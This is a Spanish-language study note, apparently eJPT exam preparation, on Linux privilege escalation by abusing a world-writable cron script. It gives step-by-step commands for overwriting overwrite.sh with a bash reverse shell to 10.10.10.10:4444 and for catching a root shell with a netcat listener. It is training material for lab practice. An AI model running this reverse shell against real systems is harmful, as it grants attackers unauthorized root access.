
- Los trabajos cron son programas o scripts que los usuarios pueden programar para que se ejecuten en momentos o intervalos específicos. Los archivos de tabla cron (crontabs) almacenan la configuración de las tareas cron. El crontab de todo el sistema se encuentra en /etc/crontab.

- Vea el contenido del crontab de todo el sistema:

```
cat /etc/crontab
```

![[Apuntes/Imagenes/Pasted image 20240323000137.png]]
- Debería haber dos trabajos cron programados para ejecutarse cada minuto. Uno ejecuta overwrite.sh, el otro ejecuta /usr/local/bin/compress.sh.

- Localice la ruta completa del archivo overwrite.sh:

```
locate overwrite.sh
```

- Tenga en cuenta que el archivo se puede escribir en todo el mundo:

```
ls -l /usr/local/bin/overwrite.sh
```

- Reemplace el contenido del archivo overwrite.sh con lo siguiente después de cambiar la dirección IP a la de su Kali Box.

```
#!/bin/bash  
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

- Configure un detector de netcat en su caja Kali en el puerto 4444 y espere a que se ejecute el trabajo cron (no debería tardar más de un minuto).Un shell raíz debería conectarse nuevamente a su oyente netcat. Si no vuelve a verificar los permisos del archivo, ¿falta algo?

```
nc -nvlp 4444
```

Enlace:
[[Local/Ciberseguridad/HACKING/CERTIFICACIONES/EJPT/Preparacion-Ejpt]]
[[Apuntes/Ciberseguridad/HACKING/TECNICAS DE ESCALACION DE PRIVILEGIOS/Linux/Cron Jobs - Wildcards]]
[[Apuntes/Ciberseguridad/HACKING/TECNICAS DE ESCALACION DE PRIVILEGIOS/Linux/Cron Jobs - PATH Environment Variable]]
